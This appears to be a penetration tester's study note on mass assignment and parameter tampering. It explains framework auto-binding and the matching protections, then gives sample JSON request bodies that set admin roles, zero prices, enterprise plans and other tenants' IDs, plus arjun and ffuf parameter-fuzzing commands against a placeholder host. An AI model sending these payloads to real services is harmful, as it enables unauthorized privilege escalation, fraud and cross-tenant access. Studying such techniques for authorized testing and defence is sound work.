---
tags: [bac, attack, mass-assignment, parameter]
type: attack
severity: high
date: 2026-03-10
---

# 💉 Mass Assignment & Parameter Tampering

## Mass Assignment Explained
Frameworks like Rails, Laravel, Express, Django REST, Spring bind request body fields DIRECTLY to model attributes. If `isAdmin`, `role`, `balance`, `credits` are model attributes and the endpoint doesn't filter them → attacker can set them.

---

## Affected Frameworks & Default Behavior

| Framework | Auto-binding? | Protection |
|---|---|---|
| Ruby on Rails | ✅ Yes | `attr_accessible`, `strong_parameters` |
| Laravel (PHP) | ✅ Yes | `$fillable` / `$guarded` arrays |
| Express + Mongoose | ✅ Yes | Manual field filtering required |
| Django REST | ✅ Yes | Serializer `fields` / `read_only_fields` |
| Spring Boot | ✅ Yes | `@JsonIgnore`, DTOs |
| ASP.NET MVC | ✅ Yes | `[Bind]` attribute, `BindNever` |

---

## Finding Vulnerable Parameters

```
Step 1: Discover the data model
  - Look at API response — what fields come back?
  - Check Swagger/OpenAPI for full model definition
  - Inspect source code (GitHub recon)
  - Check framework docs for common admin fields

Step 2: Common hidden/privilege fields to test:
  isAdmin, is_admin, admin
  role, userRole, user_role, accountType
  verified, isVerified, emailVerified
  activated, active, status
  credits, balance, coins, points
  subscriptionLevel, plan, tier
  permissions, scopes, capabilities
  ownerId, userId, tenantId (horizontal mass assignment)
  price, amount, discount (financial manipulation)
  createdAt, updatedAt (may affect logic)

Step 3: Send them in your request body
  PUT /api/users/me
  {"displayName": "test", "isAdmin": true}
  
Step 4: Verify: fetch your profile back — is isAdmin now true?
```

---

## Targeted Examples

### E-commerce: Free Premium
```http
POST /api/checkout
{
  "items": [{"id": "product_123", "qty": 1}],
  "price": 0,                    ← override price
  "discount_percent": 100,       ← 100% discount
  "coupon": "FREESTUFF"
}
```

### SaaS: Upgrade Plan for Free
```http
PUT /api/users/me/profile
{
  "name": "Hacker",
  "plan": "enterprise",          ← upgrade plan
  "subscription_status": "active",
  "trial_extended": true
}
```

### Account: Self-Elevation
```http
PATCH /api/profile
{
  "bio": "security researcher",
  "isAdmin": true,
  "role": "superadmin",
  "permissions": ["read", "write", "delete", "admin"]
}
```

### Multi-tenant: Cross-Tenant Access
```http
PUT /api/users/me
{
  "name": "Test",
  "organizationId": "target_org_id",   ← switch org!
  "tenantId": "tenant_b"
}
```

---

## Automated Discovery
```bash
# arjun - HTTP parameter discovery
python3 arjun.py -u https://target.com/api/users/me -m PUT \
  --headers "Authorization: Bearer TOKEN"

# param-miner (Burp extension)
# Right-click request → Extensions → Param Miner → Guess body params

# ffuf for parameter fuzzing
ffuf -u https://target.com/api/users/me -X PUT \
  -d '{"FUZZ":"true"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,201,204
```

---

## Tasks
- [ ] #task On all PUT/PATCH/POST endpoints, test common privilege fields
- [ ] #task Check API responses for fields not sent in request (these exist in model)
- [ ] #task Search GitHub for target's codebase — find model definitions
- [ ] #task Use Arjun or Param Miner to discover hidden parameters
- [ ] #task Test financial fields: price, amount, discount, credits
- [ ] #task Test tenant/org fields for cross-tenant mass assignment

---

## 🔗 Related Notes
- [[API-BAC]]
- [[Horizontal-vs-Vertical]]
- [[Parameter-Tampering]]

---
*Tags: #mass-assignment #bac #attack #parameter*

---

## ⚠️ Command Reference Correction

The arjun command in the Automated Discovery section above uses `python3 arjun.py` — this is only correct if you cloned the repository directly. If you installed via pip (`pip install arjun`), the correct command is:

```bash
# After pip install arjun:
arjun -u https://target.com/api/users/me -m PUT \
  --headers "Authorization: Bearer TOKEN" \
  --stable -q

# After git clone:
python3 arjun.py -u https://target.com/api/users/me -m PUT \
  --headers "Authorization: Bearer TOKEN"
```
